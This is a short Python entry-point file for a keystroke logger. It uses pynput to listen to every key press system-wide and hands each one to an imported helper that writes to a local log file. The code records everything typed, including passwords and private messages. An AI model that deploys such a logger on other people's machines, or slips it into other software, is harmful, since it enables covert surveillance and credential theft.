# main.py
from pynput import keyboard
from keypresses_base import on_key_press

log_file = 'keystrokes_log.txt'

def main():
    def on_key(key):
        try:
            on_key_press(log_file, key)  # Pass both log_file and key as arguments
        except Exception as e:
            print("Error writing to file:", e)

    with keyboard.Listener(on_press=on_key) as listener:
        listener.join()

if __name__ == '__main__':
    main()
